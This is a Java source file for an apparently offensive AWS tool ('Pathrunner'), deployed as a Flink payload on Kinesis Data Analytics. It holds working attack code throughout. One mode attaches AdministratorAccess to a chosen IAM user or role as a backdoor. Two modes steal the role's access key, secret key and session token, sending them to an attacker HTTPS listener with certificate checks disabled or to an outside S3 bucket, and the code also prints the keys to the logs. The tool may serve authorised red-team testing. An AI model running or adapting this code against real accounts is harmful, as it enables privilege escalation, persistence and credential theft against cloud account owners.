package com.pathrunner;

import com.amazonaws.services.kinesisanalytics.runtime.KinesisAnalyticsRuntime;
import org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;
import org.apache.flink.streaming.api.functions.source.SourceFunction;

import software.amazon.awssdk.auth.credentials.AwsCredentials;
import software.amazon.awssdk.auth.credentials.AwsSessionCredentials;
import software.amazon.awssdk.auth.credentials.DefaultCredentialsProvider;
import software.amazon.awssdk.core.sync.RequestBody;
import software.amazon.awssdk.services.iam.IamClient;
import software.amazon.awssdk.services.iam.model.NoSuchEntityException;
import software.amazon.awssdk.services.s3.S3Client;
import software.amazon.awssdk.services.s3.model.PutObjectRequest;
import software.amazon.awssdk.services.sts.StsClient;
import software.amazon.awssdk.services.sts.model.GetCallerIdentityResponse;

import javax.net.ssl.*;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.time.Instant;
import java.util.Map;
import java.util.Properties;

/**
 * Universal Pathrunner Flink payload JAR.
 *
 * Reads PAYLOAD_TYPE from the Kinesis Analytics application property group
 * "PayloadProperties" via KinesisAnalyticsRuntime.getApplicationProperties().
 * Parameters for each payload type are also read from the same group.
 *
 * Payload types and required properties:
 *   backdoor/attach-policy  TARGET_ARN, POLICY_ARN
 *   exfil/https             HTTPS_URL
 *   exfil/s3                EXFIL_BUCKET, EXFIL_PREFIX
 */
public class PayloadJob {

    public static void main(String[] args) throws Exception {
        // KDA EnvironmentProperties are NOT JVM system properties — read via the runtime API.
        Map<String, Properties> appProperties = KinesisAnalyticsRuntime.getApplicationProperties();
        Properties payloadProps = appProperties.getOrDefault("PayloadProperties", new Properties());

        String payloadType = payloadProps.getProperty("PAYLOAD_TYPE", "");
        System.out.println("=== Pathrunner Flink Payload ===");
        System.out.println("Payload type: " + payloadType);

        try {
            switch (payloadType) {
                case "backdoor/attach-policy":
                    runAttachPolicy(payloadProps);
                    break;
                case "exfil/https":
                    runExfilHTTPS(payloadProps);
                    break;
                case "exfil/s3":
                    runExfilS3(payloadProps);
                    break;
                default:
                    System.err.println("Unknown payload type: '" + payloadType + "'");
                    System.err.println("Set PayloadProperties.PAYLOAD_TYPE to one of: " +
                            "backdoor/attach-policy, exfil/https, exfil/s3");
                    break;
            }
        } catch (Exception e) {
            System.err.println("Payload execution failed: " + e.getMessage());
            e.printStackTrace();
        }

        // Keepalive: run a minimal Flink job so the application stays in RUNNING state
        // long enough for the module to observe and verify the payload's effect.
        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();
        env.addSource(new SourceFunction<String>() {
            private volatile boolean running = true;

            @Override
            public void run(SourceContext<String> ctx) throws Exception {
                while (running) {
                    Thread.sleep(60_000);
                }
            }

            @Override
            public void cancel() {
                running = false;
            }
        }).name("keepalive");

        env.execute("Pathrunner Payload Complete");
    }

    // --- backdoor/attach-policy ---

    private static void runAttachPolicy(Properties props) {
        String targetArn = props.getProperty("TARGET_ARN", "");
        String policyArn = props.getProperty("POLICY_ARN", "arn:aws:iam::aws:policy/AdministratorAccess");

        if (targetArn.isEmpty()) {
            System.err.println("TARGET_ARN not set in PayloadProperties");
            return;
        }

        System.out.println("Target: " + targetArn);
        System.out.println("Policy: " + policyArn);

        try (IamClient iam = IamClient.builder().build()) {
            if (targetArn.contains(":user/")) {
                String name = targetArn.substring(targetArn.lastIndexOf(":user/") + 6);
                iam.attachUserPolicy(r -> r.userName(name).policyArn(policyArn));
                System.out.println("SUCCESS: Attached " + policyArn + " to user " + name);
            } else if (targetArn.contains(":role/")) {
                String name = targetArn.substring(targetArn.lastIndexOf(":role/") + 6);
                iam.attachRolePolicy(r -> r.roleName(name).policyArn(policyArn));
                System.out.println("SUCCESS: Attached " + policyArn + " to role " + name);
            } else {
                // Plain name — try user first, fall back to role
                try {
                    iam.attachUserPolicy(r -> r.userName(targetArn).policyArn(policyArn));
                    System.out.println("SUCCESS: Attached " + policyArn + " to user " + targetArn);
                } catch (NoSuchEntityException e) {
                    iam.attachRolePolicy(r -> r.roleName(targetArn).policyArn(policyArn));
                    System.out.println("SUCCESS: Attached " + policyArn + " to role " + targetArn);
                }
            }
        }
    }

    // --- exfil/https ---

    private static void runExfilHTTPS(Properties props) throws Exception {
        String httpsUrl = props.getProperty("HTTPS_URL", "");
        if (httpsUrl.isEmpty()) {
            System.err.println("HTTPS_URL not set in PayloadProperties");
            return;
        }

        System.out.println("Exfiltrating credentials to: " + httpsUrl);

        AwsCredentials creds = DefaultCredentialsProvider.create().resolveCredentials();
        GetCallerIdentityResponse identity;
        try (StsClient sts = StsClient.builder().build()) {
            identity = sts.getCallerIdentity();
        }

        String json = buildCredentialJSON(identity.arn(), identity.account(), creds);

        // Trust all SSL certs — the attacker listener uses a self-signed certificate.
        SSLContext sslCtx = SSLContext.getInstance("TLS");
        sslCtx.init(null, new TrustManager[]{new X509TrustManager() {
            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
            public void checkClientTrusted(X509Certificate[] c, String a) {}
            public void checkServerTrusted(X509Certificate[] c, String a) {}
        }}, new SecureRandom());

        HttpClient client = HttpClient.newBuilder().sslContext(sslCtx).build();
        HttpRequest req = HttpRequest.newBuilder()
                .uri(URI.create(httpsUrl))
                .header("Content-Type", "application/json")
                .header("User-Agent", "Mozilla/5.0 (compatible; AWS-Flink)")
                .header("X-Pathrunner", "kinesisanalytics-exfil")
                .POST(HttpRequest.BodyPublishers.ofString(json))
                .build();

        try {
            HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
            System.out.println("Exfil HTTP status: " + resp.statusCode());
        } catch (Exception e) {
            System.err.println("Exfil request failed: " + e.getMessage());
        }

        printIdentityMarkers(identity.arn(), creds);
    }

    // --- exfil/s3 ---

    private static void runExfilS3(Properties props) {
        String bucket = props.getProperty("EXFIL_BUCKET", "");
        String prefix = props.getProperty("EXFIL_PREFIX", "exfil/");
        if (bucket.isEmpty()) {
            System.err.println("EXFIL_BUCKET not set in PayloadProperties");
            return;
        }

        System.out.println("Exfiltrating credentials to s3://" + bucket + "/" + prefix + "...");

        AwsCredentials creds = DefaultCredentialsProvider.create().resolveCredentials();
        GetCallerIdentityResponse identity;
        try (StsClient sts = StsClient.builder().build()) {
            identity = sts.getCallerIdentity();
        } catch (Exception e) {
            System.err.println("Failed to get caller identity: " + e.getMessage());
            return;
        }

        String json = buildCredentialJSON(identity.arn(), identity.account(), creds);
        String key = prefix + identity.account() + "/" + Instant.now().toEpochMilli() + ".json";

        try (S3Client s3 = S3Client.builder().build()) {
            s3.putObject(PutObjectRequest.builder()
                    .bucket(bucket)
                    .key(key)
                    .contentType("application/json")
                    .build(), RequestBody.fromString(json));
            System.out.println("Credentials written to s3://" + bucket + "/" + key);
        } catch (Exception e) {
            System.err.println("S3 write failed: " + e.getMessage());
        }

        printIdentityMarkers(identity.arn(), creds);
    }

    // --- helpers ---

    private static String buildCredentialJSON(String arn, String accountId, AwsCredentials creds) {
        String token = (creds instanceof AwsSessionCredentials)
                ? ((AwsSessionCredentials) creds).sessionToken() : "";
        return "{" +
                "\"type\":\"kinesisanalytics_credential_exfil\"," +
                "\"arn\":\"" + arn + "\"," +
                "\"account\":\"" + accountId + "\"," +
                "\"access_key_id\":\"" + creds.accessKeyId() + "\"," +
                "\"secret_access_key\":\"" + creds.secretAccessKey() + "\"," +
                "\"session_token\":\"" + token + "\"" +
                "}";
    }

    private static void printIdentityMarkers(String arn, AwsCredentials creds) {
        String name = arn.contains("/") ? arn.substring(arn.lastIndexOf('/') + 1) : arn;
        String token = (creds instanceof AwsSessionCredentials)
                ? ((AwsSessionCredentials) creds).sessionToken() : "";

        System.out.println("--- PATHFINDER_IDENTITY_DATA ---");
        System.out.println("NAME=flink-role/" + name);
        System.out.println("TYPE=keys");
        System.out.println("ACCESS_KEY_ID=" + creds.accessKeyId());
        System.out.println("SECRET_ACCESS_KEY=" + creds.secretAccessKey());
        if (!token.isEmpty()) {
            System.out.println("SESSION_TOKEN=" + token);
        }
        System.out.println("AUTO_SWITCH=false");
        System.out.println("--- END_PATHFINDER_IDENTITY_DATA ---");
    }
}
